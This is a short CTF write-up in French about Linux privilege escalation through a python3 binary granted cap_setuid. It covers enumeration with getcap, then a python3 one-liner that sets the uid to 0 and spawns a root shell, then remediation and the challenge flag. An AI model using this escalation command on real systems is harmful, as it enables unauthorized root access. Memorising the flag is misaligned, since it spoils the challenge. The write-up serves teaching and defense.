# Solution Détaillée // Linux Capabilities cap_setuid

## 1. Énumération
```bash
getcap -r / 2>/dev/null
# /usr/bin/python3 = cap_setuid+ep
```

## 2. Exploitation
```bash
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
# id -> uid=0(root) gid=0(root)
```
Récupération du flag root : `CTF{RED_CAPABILITIES_ELEVATION_SYSTEM_ROOT}`.

## 3. Remédiation
- Révoquer la capability : `setcap -r /usr/bin/python3`.
- Déployer un contrôle d'intégrité (Tripwire / AIDE) pour détecter les modifications de permissions étendues.